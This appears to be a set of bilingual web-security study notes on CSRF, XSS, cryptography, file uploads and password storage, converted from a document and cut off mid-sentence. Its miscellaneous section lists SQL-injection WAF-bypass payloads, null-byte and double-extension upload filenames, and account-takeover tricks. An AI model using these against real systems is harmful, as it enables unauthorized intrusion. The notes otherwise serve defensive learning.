|                                                                       |
+-----------------------------------------------------------------------+

### CSRF (Cross-Site Request Forgery Prevention)

+-----------------------------------------------------------------------+
| -   Use Built-In Or Existing CSRF Implementations for CSRF Protection |
+=======================================================================+
| -   CSRF tokens should be generated once per user session or for each |
|     > request ( for more security but less usability : Interaction    |
|     > with a previous page will result in a CSRF false positive       |
|     > security event at the server ).                                 |
+-----------------------------------------------------------------------+
| -   CSRF tokens should be:                                            |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Unique per user session.                                          |
|                                                                       |
| -   Secret                                                            |
|                                                                       |
| -   Unpredictable (large random value generated by a secure method).  |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+
| -   Defense In Depth Techniques                                       |
|                                                                       |
|     -   SameSite Cookie Attribute ( to not include cookie )           |
|                                                                       |
|     -   Verifying Origin With Standard Headers. Reliability on these  |
|         > headers comes from the fact that they cannot be altered     |
|         > programmatically (using JavaScript with an XSS              |
|         > vulnerability) as they fall under forbidden headers list,   |
|         > meaning that only the browser can set them :                |
|                                                                       |
|         -   Checking the Origin header                                |
|                                                                       |
|         -   Checking the Referrer header                              |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   User Interaction Based CSRF Defense                               |
|                                                                       |
|     -   Re-Authentication (password or stronger)                      |
|                                                                       |
|     -   One-time Token                                                |
|                                                                       |
|     -   CAPTCHA                                                       |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Inserting the CSRF token in the custom HTTP request header via    |
|     > JavaScript is considered more secure because it uses custom     |
|     > request headers :                                               |
|                                                                       |
|     -   This defense relies on the same-origin policy (SOP)           |
|         > restriction that only JavaScript can be used to add a       |
|         > custom header, and only within its origin. By default,      |
|         > browsers do not allow JavaScript to make cross origin       |
|         > requests with custom headers.                               |
|                                                                       |
| ![](media/image418.png){width="5.554339457567804in"                   |
| height="4.929349300087489in"}                                         |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+

## 

-   ### XSS

Different Encoding type and Mechanism :

  -----------------------------------------------------------------------
  Encoding Type Encoding Mechanism
  ------------- ---------------------------------------------------------
  HTML Entity   Convert & to &amp;, Convert \< to &lt;, Convert \> to
  Encoding      &gt;, Convert \" to &quot;, Convert \' to &#x27;, Convert
                / to &#x2F;

  HTML          Except for alphanumeric characters, encode all characters
  Attribute     with the HTML Entity &#xHH; format, including spaces. (HH
  Encoding      = Hex Value)

  URL Encoding  Standard percent encoding. URL encoding should only be
                used to encode parameter values, not the entire URL or
                path fragments of a URL.

  JavaScript    Except for alphanumeric characters, encode all characters
  Encoding      with the \\uXXXX unicode encoding format (X = Integer).

  CSS Hex       CSS encoding supports \\XX and \\XXXXXX.
  Encoding      
  -----------------------------------------------------------------------

#### 

+-----------------------------------------------------------------------+
| -   HTML Encode Before Inserting Untrusted Data into HTML Element     |
|     > Content                                                         |
|                                                                       |
|     -   When you want to put untrusted data directly into the HTML    |
|         > body somewhere. This includes inside normal tags like div,  |
|         > p, b, td \...                                               |
+=======================================================================+
| -   Use a Security Encoding Library instead of writing your own.      |
+-----------------------------------------------------------------------+
| -   Attribute Encode Before Inserting Untrusted Data into HTML Common |
|     > Attributes                                                      |
|                                                                       |
|     -   1\) Always quote dynamic attributes with \" or \'.            |
|                                                                       |
| > Quoted attributes can only be broken out of with the corresponding  |
| > quote, while unquoted attributes can be broken out of with many     |
| > characters ( including \[space\] % \* + , - / ; \< = \> \^ and \|.) |
|                                                                       |
| -   2\) Encode the corresponding quote: \" and \' should be encoded   |
|     > to &#x22; and &#x27; respectively.                              |
+-----------------------------------------------------------------------+
| -   JavaScript Encode Before Inserting Untrusted Data into JavaScript |
|     > Data Values                                                     |
|                                                                       |
|     -   The only safe place to put untrusted data into this JS code   |
|         > is inside a quoted \"data value\".                          |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Please note there are some JavaScript functions that can never    |
|     > safely use untrusted data as input - EVEN IF JAVASCRIPT ENCODED |
|     > !!!                                                             |
|                                                                       |
| > For example : window.setInterval(\'\...'), ...                      |
|                                                                       |
| -   Avoid using any escaping shortcuts like \\\" because the quote    |
|     character may be matched by the HTML attribute parser which runs  |
|     first and these escaping are also susceptible to                  |
|     escape-the-escape attacks ( \\\\" ).                              |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -                                                                     |
+-----------------------------------------------------------------------+
| -   HTML Encode JSON values                                           |
|                                                                       |
|     -   Ensure returned Content-Type header is application/json and   |
|         > not text/html                                               |
+-----------------------------------------------------------------------+
| -   URL Encode Before Inserting Untrusted Data into HTML URL          |
|     > Parameter Values                                                |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+

### Résumé :

![](media/image429.png){width="8.253390201224846in"
height="5.140625546806649in"}

## 

## 

## 

## 

###  Cryptographic Storage

## 

+-----------------------------------------------------------------------+
| -   Passwords should not be stored using reversible encryption -      |
|     > secure password slow hashing algorithms should be used instead. |
+=======================================================================+
| -   For symmetric encryption, AES-128 (ideally 256 bits) and a secure |
|     > mode should be used as the preferred algorithm.                 |
|                                                                       |
| In some cases there may be regulatory requirements that limit the     |
| algorithms that can be used, such as FIPS 140-2 or PCI DSS.           |
+-----------------------------------------------------------------------+
| -   For asymmetric encryption, use elliptical curve cryptography      |
|     > (ECC) with a secure curve such as Curve25519 as a preferred     |
|     > algorithm. If ECC is not available and RSA must be used, then   |
|     > ensure that the key is at least 2048 bits.                      |
|                                                                       |
| In some cases there may be regulatory requirements that limit the     |
| algorithms that can be used, such as FIPS 140-2 or PCI DSS.           |
+-----------------------------------------------------------------------+
| -   INFO : Many other symmetric and asymmetric algorithms are         |
|     > available which have their own pros and cons, and they may be   |
|     > better or worse than AES or Curve25519 in specific use cases.   |
|     > When considering these, a number of factors should be taken     |
|     > into account, including:                                        |
|                                                                       |
|     -   Key size.                                                     |
|                                                                       |
|     -   Known attacks and weaknesses of the algorithm.                |
|                                                                       |
|     -   Maturity of the algorithm.                                    |
|                                                                       |
|     -   Approval by third parties such as NIST\'s algorithmic         |
|         > validation program.                                         |
|                                                                       |
|     -   Performance (both for encryption and decryption).             |
|                                                                       |
|     -   Quality of the libraries available.                           |
|                                                                       |
|     -   Portability of the algorithm (i.e, how widely supported is    |
|         > it).                                                        |
+-----------------------------------------------------------------------+
| -   Cipher Modes :                                                    |
|                                                                       |
|     -   Where available, authenticated modes should always be used.   |
|         > These provide guarantees of the integrity and authenticity  |
|         > of the data, as well as confidentiality. The most commonly  |
|         > used authenticated modes are GCM and CCM, which should be   |
|         > used as a first preference.                                 |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   If GCM or CCM are not available, then CTR mode or CBC mode should |
|     > be used. As these do not provide any guarantees about the       |
|     > authenticity of the data, separate authentication should be     |
|     > implemented, such as using the Encrypt-then-MAC technique.      |
|                                                                       |
| > ![](media/image43.png){width="2.4166666666666665in"                 |
| > height="2.15625in"}                                                 |
| >                                                                     |
| > to resume :                                                         |
|                                                                       |
| 1)  GCM or CCM                                                        |
|                                                                       |
| 2)  CTR or CBC with a implemented authentication (Encrypt-then-MAC)   |
+-----------------------------------------------------------------------+
| -   Secure Random Number Generation                                   |
|                                                                       |
|     -   Pseudo-Random Number Generators (PRNG) VS Cryptographically   |
|         > Secure Pseudo-Random Number Generators (CSPRNG) :           |
|                                                                       |
| +--------------------------------+--------------------------------+   |
| | PRNG                           | CSPNRG                         |   |
| +================================+================================+   |
| | provide low-quality randomness | produce a much higher quality  |   |
| | but much faster                | of randomness but they are     |   |
| |                                | slower and more CPU intensive. |   |
| +--------------------------------+--------------------------------+   |
| | Should be used for             | safe to use for                |   |
| | non-security related           | security-sensitive             |   |
| | functionality.                 | functionality.                 |   |
| |                                |                                |   |
| | They must not be used for      |                                |   |
| | anything security critical, as |                                |   |
| | it is often possible for       |                                |   |
| | attackers to guess or predict  |                                |   |
| | the output.                    |                                |   |
| +--------------------------------+--------------------------------+   |
| |                                |                                |   |
| +--------------------------------+--------------------------------+   |
| |                                |                                |   |
| +--------------------------------+--------------------------------+   |
|                                                                       |
| ![](media/image297.png){width="6.375in" height="5.138888888888889in"} |
|                                                                       |
| -   Defence in Depth                                                  |
|                                                                       |
|     -   Applications should be designed to still be secure even if    |
|         > cryptographic controls fail. Any information that is stored |
|         > in an encrypted form should also be protected by additional |
|         > layers of security (should enforce strong access control to |
|         > prevent unauthorised access to information).                |
+-----------------------------------------------------------------------+
| -   Key Management                                                    |
|                                                                       |
|     -   Keys should be randomly generated using a cryptographically   |
|         > secure function                                             |
|                                                                       |
|     -   Keys should not be based on common words or phrases, or on    |
|         > \"random\" characters generated by mashing the keyboard.    |
|                                                                       |
|     -   Key Lifetimes and Rotation                                    |
|                                                                       |
|         -   Encryption keys should be changed :                       |
|                                                                       |
|             -   If the previous key is known (or suspected) to have   |
|                 > been compromised.                                   |
|                                                                       |
|             -   After a specified period of time has elapsed (known   |
|                 > as the cryptoperiod).                               |
|                                                                       |
|             -   After the key has been used to encrypt a specific     |
|                 > amount of data ( this would typically be 2\^35      |
|                 > bytes (\~34GB) for 64-bit keys and 2\^68 bytes      |
|                 > (\~295 exabytes) for 128 bit keys.)                 |
|                                                                       |
|             -   If there is a significant change to the security      |
|                 > provided by the algorithm (such as a new attack     |
|                 > being announced).                                   |
|                                                                       |
|             -   It is important that the code and processes required  |
|                 > to rotate a key are in place before they are        |
|                 > required                                            |
|                                                                       |
|     -   Key Storage                                                   |
|                                                                       |
|         -   Where available, the secure storage mechanisms provided   |
|             > by the operating system, framework or cloud service     |
|             > provider should be used. These include:                 |
|                                                                       |
|             -   A physical Hardware Security Module (HSM).            |
|                                                                       |
|             -   A virtuel HSM.                                        |
|                                                                       |
|             -   Key vaults such as Amazon KMS or Azure Key Vault.     |
|                                                                       |
| > There are many advantages to using these types of secure storage :  |
|                                                                       |
| -   Central management of keys, especially in containerised           |
|     > environments.                                                   |
|                                                                       |
| -   Easy key rotation and replacement.                                |
|                                                                       |
| -   Secure key generation.                                            |
|                                                                       |
| -   Simplifying compliance with regulatory standards such as FIPS 140 |
|     > or PCI DSS.                                                     |
|                                                                       |
| -   Making it harder for an attacker to export or steal keys.         |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Do not hard-code keys into the application source code.           |
|                                                                       |
| -   Protect the configuration files containing the keys with          |
|     > restrictive permissions.                                        |
|                                                                       |
|     -   Avoid storing keys in environment variables, as these can be  |
|         > accidentally exposed through functions such as phpinfo() or |
|         > through the /proc/self/environ file.                        |
|                                                                       |
|     -   Where possible, encryption keys should be stored in a         |
|         > separate location from encrypted data. For example, if the  |
|         > data is stored in a database, the keys should be stored in  |
|         > the filesystem. This means that if an attacker only has     |
|         > access to one of these (for example through directory       |
|         > traversal or SQL injection), they cannot access both the    |
|         > keys and the data.                                          |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

## 

### 

### Database Security

+-----------------------------------------------------------------------+
| -   The backend database used by the application should be isolated   |
|     > as much as possible, in order to prevent malicious or           |
|     > undesirable users from being able to connect to it. The         |
|     > following options could be used to protect it :                 |
|                                                                       |
|     -   Restricting access to the network port to specific hosts with |
|         > firewall rules.                                             |
|                                                                       |
|     -   Placing the database server in a separate DMZ isolated from   |
|         > the application server.                                     |
+=======================================================================+
| -   When an application is running on an untrusted system (such as a  |
|     > thick-client), it should always connect to the backend through  |
|     > an API that can enforce appropriate access control and          |
|     > restrictions. Direct connections should never be made from a    |
|     > thick client to the backend database.                           |
+-----------------------------------------------------------------------+
| -   Transport Layer Protection :                                      |
|                                                                       |
|     -   Configure the database to only allow encrypted connections if |
|         > it possible                                                 |
+-----------------------------------------------------------------------+
| -   Authentication                                                    |
|                                                                       |
|     -   The database should be configured to always require           |
|         > authentication, including connections from the local        |
|         > server. Database accounts should be Protected with strong   |
|         > and unique passwords.                                       |
+-----------------------------------------------------------------------+
| -   Database Configuration and Hardening                              |
|                                                                       |
|     -   The database application should also be properly configured   |
|         > and hardened. The following principles should apply to any  |
|         > database application and platform:                          |
|                                                                       |
|         -   Install any required security updates and patches.        |
|                                                                       |
|         -   Configure the database services to run under a low        |
|             > privileged user account.                                |
|                                                                       |
|         -   Remove any default accounts and databases.                |
|                                                                       |
|         -   Store transaction logs on a separate disk to the main     |
|             > database files.                                         |
|                                                                       |
|         -   Configure a regular backup of the database.               |
|                                                                       |
|         -   Ensure that the backups are protected with appropriate    |
|             > permissions, and ideally encrypted.                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

## 

### Php configuration

+-----------------------------------------------------------------------+
| -   php.ini                                                           |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   ![](media/image391.png){width="5.739583333333333in"               |
|     > height="2.2083333333333335in"}                                  |
|                                                                       |
|     -                                                                 |
+=======================================================================+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -   Snuffleupagus                                                     |
+-----------------------------------------------------------------------+

### 

### 

### Unvalidated Redirects and Forwards

+-----------------------------------------------------------------------+
| -   When applications allow user input to forward requests between    |
|     > different parts of the site, the application must check that    |
|     > the user is authorized to access the URL.                       |
|                                                                       |
| > If the application fails to perform these checks, an attacker       |
| > crafted URL may pass the application\'s access control check and    |
| > then forward the attacker to an administrative function that is not |
| > normally permitted.                                                 |
| >                                                                     |
| > ![](media/image8.png){width="4.6875in"                              |
| > height="1.0520833333333333in"}                                      |
+=======================================================================+
| -   Preventing Unvalidated Redirects and Forwards                     |
|                                                                       |
|     -   Sanitize input by creating a list of trusted URLs (lists of   |
|         > hosts or a regex).                                          |
|                                                                       |
| > This should be based on an allow-list approach, rather than a block |
| > list.                                                               |
|                                                                       |
| -   Force all redirects to first go through a page notifying users    |
|     > that they are going off of your site, with the destination      |
|     > clearly displayed, and have them click a link to confirm.       |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

### 

### File Uploads

+-----------------------------------------------------------------------+
| -   There is no silver bullet in validating user content.             |
|     > Implementing a defense in depth approach is key to make the     |
|     > upload process harder and more locked down to the needs and     |
|     > requirements for the service                                    |
|                                                                       |
| > Implementing multiple techniques is key and recommended, as no one  |
| > technique is enough to secure the service.                          |
+=======================================================================+
| -   File Upload Protection                                            |
|                                                                       |
|     -   Extension validation                                          |
|                                                                       |
|         -   Ensure that the validation occurs after decoding the file |
|             > name, and that a proper filter is set in place in order |
|             > to avoid certain known bypasses:                        |
|                                                                       |
|             -   Double extensions                                     |
|                                                                       |
|             -   Null bytes (.php%00.jpg)                              |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   List Allowed Extensions                                           |
|                                                                       |
|     -   Ensure the usage of business-critical extensions only,        |
|         > without allowing any type of non-required extensions. For   |
|         > example if the system requires:                             |
|                                                                       |
|         -   Image upload, allow one type that is agreed upon to fit   |
|             > the business requirement.                               |
|                                                                       |
|         -   Cv upload, allow docx and pdf extensions.                 |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Content-Type Validation                                           |
|                                                                       |
|     -   Other than defining the extension of the uploaded file, its   |
|         > MIME-type can be checked for a quick protection against     |
|         > simple file upload attacks.                                 |
|                                                                       |
|     -   This can be done preferably in an allow list approach         |
|                                                                       |
| -   File Signature Validation                                         |
|                                                                       |
|     -   In conjunction with content-type validation, validating the   |
|         > file\'s signature can be checked and verified against the   |
|         > expected file that should be received.                      |
|                                                                       |
| > This should not be used on its own, as bypassing it is pretty       |
| > common and easy.                                                    |
|                                                                       |
| -   Filename Sanitization                                             |
|                                                                       |
|     -   Creating a random string as a file-name, such as generating a |
|         > UUID/GUID, is essential.                                    |
|                                                                       |
|     -   If user filenames are required, consider implementing the     |
|         > following:                                                  |
|                                                                       |
|         -   Implement a maximum length                                |
|                                                                       |
|         -   Restrict characters to an allowed subset specifically,    |
|             > such as alphanumeric characters, hyphen, spaces, and    |
|             > periods.                                                |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   File Content Validation                                           |
|                                                                       |
|     -   Based on the expected type, special file content validation   |
|         > can be applied:                                             |
|                                                                       |
|         -   For images, applying image rewriting techniques destroys  |
|             > any kind of malicious content injected in an image;     |
|             > this could be done through randomization.               |
|                                                                       |
|         -   ZIP files are not recommended since they can contain all  |
|             > types of files, and the attack vectors pertaining to    |
|             > them are numerous.                                      |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   File Storage Location                                             |
|                                                                       |
|     -   The following points are set by security priority, and are    |
|         > inclusive:                                                  |
|                                                                       |
|         -   Store the files on a different host                       |
|                                                                       |
|         -   Store the files outside the webroot, where only           |
|             > administrative access is allowed or inside the webroot, |
|             > and set them in write permissions only.                 |
|                                                                       |
|         -   Set the files permissions on the principle of least       |
|             > privilege                                               |
|                                                                       |
| -   Upload and Download Limits                                        |
|                                                                       |
|     -   The application should set proper size limits for the upload  |
|         > service in order to protect the file storage capacity.      |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| > \-                                                                  |
+-----------------------------------------------------------------------+
| > \-                                                                  |
+-----------------------------------------------------------------------+
| > \-                                                                  |
+-----------------------------------------------------------------------+
| ![](media/image272.png){width="5.6498654855643045in"                  |
| height="4.713542213473316in"}                                         |
+-----------------------------------------------------------------------+

-   ### Password Storage

+-----------------------------------------------------------------------+
| -   Passwords should be hashed, NOT encrypted.                        |
+=======================================================================+
| -   Salt should be unique per user.                                   |
+-----------------------------------------------------------------------+
| -   Salt is used to :                                                 |
|                                                                       |
|     -   Increase the time consumed in brute force or Dictionary       |
|         > attack                                                      |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Against rainbow-table                                             |
|                                                                       |
|     -   Salting also means that it is impossible to determine whether |
|         > two users have the same password                            |
+-----------------------------------------------------------------------+
| -   Modern hashing algorithms such as Argon2id, bcrypt, and PBKDF2    |
|     > automatically salt the passwords, so no additional steps are    |
|     > required when using them.                                       |
+-----------------------------------------------------------------------+
| -   Peppering :                                                       |
|                                                                       |
|     -   A pepper can be used in addition to salting to provide an     |
|         > additional layer of protection. The purpose of the pepper   |
|         > is to prevent an attacker from being able to crack any of   |
|         > the hashes if they only have access to the database.        |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   One of several peppering strategies (there are multiples          |
|     > strategies in peppering) is to hash the passwords as usual      |
|     > (using a password hashing algorithm) and then HMAC or encrypt   |
|     > the hashes with a symmetrical encryption key before storing the |
|     > password hash in the database, with the key acting as the       |
|     > pepper.                                                         |
+-----------------------------------------------------------------------+
| -   Work Factors :                                                    |
|                                                                       |
|     -   The work factor is essentially the number of iterations of    |
|         > the hashing algorithm that are performed for each password  |
|         > (usually, it\'s actually *2\^work* iterations).             |
|                                                                       |
| > The purpose of the work factor is to make calculating the hash more |
| > computationally expensive.                                          |
|                                                                       |
| -   When choosing a work factor, a balance needs to be struck between |
|     > security and performance.                                       |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   There is no golden rule for the ideal work factor - it will       |
|     > depend on the performance of the server and the number of users |
|     > on the application. Determining the optimal work factor will    |
|     > require experimentation on the specific server(s) used by the   |
|     > application. As a general rule, calculating a hash should take  |
|     > less than one second.                                           |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   One key advantage of having a work factor is that it can be       |
|     > increased over time as hardware becomes more powerful and       |
|     > cheaper.                                                        |
+-----------------------------------------------------------------------+
| -   International Characters :                                        |
|                                                                       |
| > Ensure your hashing library is able to accept a wide range of       |
| > characters and is compatible with all Unicode codepoints.           |
| >                                                                     |
| > Password hashing libraries need to be able to use input that may    |
| > contain a NULL byte.                                                |
| >                                                                     |
| > Users should be able to use the full range of characters available  |
| > on modern devices, in particular mobile keyboards.                  |
+-----------------------------------------------------------------------+
| ![](media/image302.png){width="6.693927165354331in"                   |
| height="3.5677088801399823in"}                                        |
+-----------------------------------------------------------------------+

-   ### MISC

####  MISC checklist

+-----------------------------------------------------------------------+
| -   Everytime that you see something that can be controlled by an     |
|     > attacker joined with a system path, make sure to prevent        |
|     > Directory Transversal attack                                    |
+=======================================================================+
| -   When you are doing a signature verification or a cryptographic    |
|     > data verification, make sure that the comparison is done in     |
|     > constant time regardless of the similarity in the values        |
|     > compared ( to avoid brute force ( time ) blind attack character |
|     > per character ) .                                               |
+-----------------------------------------------------------------------+
| -   Que signifie FIPS ?                                               |
|                                                                       |
|     -   L'acronyme FIPS renvoie à « Federal Information Processing    |
|         > Standards » (normes fédérales de traitement de              |
|         > l'information).                                             |
|                                                                       |
| > La série de normes FIPS 140 correspond aux normes de sécurité       |
| > informatique établies par le National Institute of Standards &      |
| > Technology (NIST) pour le gouvernement des États-Unis.              |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+

-   Different general and direct way for WAF bypasses :

    -   URL encode / Double URL encode ( ' =\> %27 ou %2527 )

    -   HTML encode ( ' =\> &#x27; ou &#x00027; ou &apos; ou &#39; )

```{=html}
<!-- -->
```
-   Caractère espace =\> /\*\*/ ( commentaire vide avec une syntaxe
    > selon le contexte)

```{=html}
<!-- -->
```
-   Breaking restriction in sensitive word like this :

    -   /\*\*/UN/\*\*/ION/\*\*/SEL/\*\*/ECT ...

    -   uni\*on sel\*ect

    -   uNiOn ALl sElEcT .. ( Change cases )

    -   UnIoN SeLselectECT .... ( against str_replace )

```{=html}
<!-- -->
```
-   Adding CRLF in some places ( %0A%0D ):

    -   %0A%0Dunion%0A%0D+%0A%0D+%0A%0Dselect+%0A%0D+1,2,3,4,5+\--+-

![](media/image419.png){width="5.346808836395451in"
height="8.463542213473316in"}

![](media/image325.png){width="5.088175853018373in"
height="7.838542213473316in"}

## 

-   **Attention de ne pas laisser des fichiers sensible pouvant être lue
    > ( visible par l'URL ) dans le serveur par exemple :**

    -   **Exemple fichiers :**

        -   **Fichiers se finissant par "\~" ( type de fichier
            > temporaire backup ).**

        -   **Fichiers de backup : \*.\[bak - backup - tmp - gho\]. Il
            > en existe beaucoup.Tout dépends du système utilisé.**

        -   **Fichiers d'installation de framework php.**

        -   **Fichier .git. ( extraction with GitTool ) ou .svn (
            > subversion )**

```{=html}
<!-- -->
```
-   **Dû aux différentes manières de comparer une chaîne de caractère au
    > nouveau code back-end et base de donnée, on peut tenter de créer
    > un compte admin avec le même nom de compte mais avec des
    > majuscule/minuscule échangés pour obtenir ses droits.**

> **La base de données ne va pas faire la différence entre "admin" et
> "AdMIN" par exemple. Ou pareil pour "admin" et "admin ".**

-   **Si une redirection est effectuée ( sur une page ), toujours look
    > les infos retournées par le serveur dans les requêtes réponses
    > intermédiaires.**

```{=html}
<!-- -->
```
-   **A Classic mistake with modern frameworks : Here most of the code
    > is generated automatically and access to different formats (HTML,
    > JSON) for the same database record is also done automatically.**

> **For example, by accessing /users/1, you will see an HTML page with
> the first user\'s details. crucial information has been masked.**
>
> **Fortunately, you should be able to access the JSON representation of
> this information details by modifying the URL ( /users/1.json ).**

-   **In LDAP server ( Database ), if NULL bind is configured, you can
    > connect to the DB without credentials ( just with NULL values,
    > removing the username and password POST parameters ).**

> **It's what we call a bind connection ( with less privileges than a
> common user ).**

-   **Serving requests for a single application can be done by multiple
    > backends. It can pay off to send the same request multiple times
    > to check if multiple backends are involved.**

6)  **TXT records ( in DNS ) are often used to show that people own a
    > domain or to store information to configure services, it\'s always
    > a good idea to check for those.**

> **It\'s sometimes possible to retrieve information from internal zones
> by asking publicly available servers.**

-   **The idea behind chunk-encoding ( with the header
    > *Transfer-encoding: chunked* ) is that the server can send content
    > without waiting for the full response to be ready. The server
    > sends the size of a chunk (in hexadecimal) followed by the
    > chunk.**

![](media/image383.png){width="8.208607830271216in"
height="0.8281255468066492in"}

-   La méthode HTTP HEAD demande les en-têtes qui seraient retournés si
    > la ressource spécifiée était demandée avec une méthode HTTP GET.
    > Une telle requête peut être envoyée avant de procéder au
    > téléchargement d\'une ressource volumineuse, par exemple pour
    > économiser de la bande passante.

```{=html}
<!-- -->
```
-   Filter input against "Directory traversal attack" ( exemple :
    > str_replace ça : "../" ).

```{=html}
<!-- -->
```
-   Faire attention à gérer tous les types de requêtes reçues ( pas que
    > GET et POST ) dans le code du serveur : HEAD, PUT, DELETE,
    > CONNECT, TRACE, PATCH, OPTIONS.

```{=html}
<!-- -->
```
-   Filtrer les 2 caractères CRLF ("\\r\\n") sur les champs sensibles à
    > ce genre d'attaque (avec un "str_replace" par exemple).

```{=html}
<!-- -->
```
-   Lors de l'upload de fichier (des images par exemples), faire
    > attention à l'attaque du "double extension" or "different
    > extension.

> Exemple :

-   shell.php.png ou shell.php%00.png\<-( null-byte attack) (fichier php
    > déguisé en png).

-   shell.php3 which will bypass a simple filter on .php

-   shell.php.test which will bypass a simple filter on *.php* and
    > Apache will still use *.php* since in this configuration it
    > doesn\'t have an handler for *.test*.

![](media/image372.png){width="5.520833333333333in"
height="2.8854166666666665in"}

> Faire aussi attention à vérifier si la valeur header Content-Type est
> bonne. Il peut être utilisé par un attaquant pour faire croire que le
> fichier envoyé est du type qu'il indique lui-même dans la requête
> alors que ce n'est pas le cas.

-   The HTTP TRACE method is designed for diagnostic purposes. If
    > enabled, the web server will respond to requests that use the
    > TRACE method by echoing in the response the exact request that was
    > received.

> This behavior is often harmless, but occasionally leads to information
> disclosure, such as the name of internal authentication headers that
> may be appended to requests by reverse proxies.

-   it is worth trying to navigate to /robots.txt or /sitemap.xml
    > manually to see if you find anything of use in web gathering
    > information. it\'s always a good idea visit all the pages that are
    > \"disallowed\" to find sensitive information.

```{=html}
<!-- -->
```
-   The Same-Origin Policy is one of the fundamental defenses deployed
    > in modern web applications. It restricts how a script from one
    > origin can interact with the resources of a different origin. It
    > is critical in preventing a number of common web vulnerabilities.

> The same-origin policy is a web browser security mechanism that aims
> to prevent websites from attacking each other.

-   Attention à utiliser la fonction "assert()" et "eval()" sur un input
    > utilisateur ( et peut-être même en général ). Un utilisateur
    > malveillant peut injecter du code que "assert" exécutera.

```{=html}
<!-- -->
```
-   Pour accéder à certains fichiers, lorsque l'on connaît leurs
    > localisation, l'utilisation des liens symboliques peut être
    > efficace pour bypasser certains protections ( différente extension
    > que le fichier d'origine etc ...).

```{=html}
<!-- -->
```
-   Make sure that when building a signature, it can't be reused itself
    > in another component in the application.

![](media/image362.png){width="5.889763779527559in"
height="1.1388888888888888in"}

![](media/image287.png){width="5.889763779527559in"
height="6.472222222222222in"}

#  Javascript security

-   ## CDN in JS:

### Description

**It is common to fetch JavaScript and style sheet libraries from
third-party providers as it offers a variety of advantages, not least of
which is the ability to leverage someone else\'s hosting infrastructure.
But this also extends the overall attack surface, in that if the above
mentioned provider is compromised, an attacker might inject malicious
code into the hosted libraries, thus transforming a single-entity
compromise into a massive supply-chain catastrophe, impacting every web
application reliant on the tainted libraries in question.**

![](media/image110.png){width="5.625in" height="0.6458333333333334in"}

### Impact

**Let\'s say a third-party provider like a Content Delivery Network
(CDN) is compromised. Not checking the SRI could result in an attacker
executing arbitrary code in the context of the web application with the
impact only limited to what the web application can legitimately do.**

![](media/image301.png){width="7.471006124234471in"
height="3.504099956255468in"}

-   ## Incorrect Referrer Policy :

**Suppose that some legitimate web application allows untrusted users to
add external links in one of its pages, for example:**

![](media/image81.png){width="7.700172790901138in"
height="4.320273403324585in"}

![](media/image416.png){width="7.575172790901138in"
height="3.821104549431321in"}

#  ClickJacking

-   ## prevention

![](media/image164.png){width="7.252256124234471in"
height="2.909587707786527in"}

-   Preventing session cookies from being included when the page is
    loaded in a frame using the SameSite cookie attribute.

-   Implementing JavaScript code in the page to attempt to prevent it
    being loaded in a frame (known as a \"frame-buster\").

![](media/image255.png){width="8.200172790901137in"
height="1.4948982939632547in"}

#  Linux

-   ## /etc/passwd file : 

    -   **It stores user account information.**

```{=html}
<!-- -->
```
-   **One entry per line for each user.**

    -   **It should have general read permission for many**

> **command utilities but write access only for admin.**

-   **Syntax :**

> **Example with this line : root:x:0:0:root:/root:/bin/bash**

-   **root: : username used when user logs in. It should be between 1
    > and 32 characters in length.**

-   **:x: : Indication for password : an x character indicates that
    > encrypted password is stored in /etc/shadow file.**

-   **:0: : User ID (UID): Each user must be assigned a user ID. UID 0
    > (zero) is reserved for root and UIDs 1-99 are reserved for other
    > predefined accounts. Further UID 100-999 are reserved by system
    > for administrative and system accounts/groups.**

-   **:0: : Group ID (GID): The primary group ID (stored in /etc/group
    > file)**

-   **:root: : User ID Info: The comment field. It allows you to add
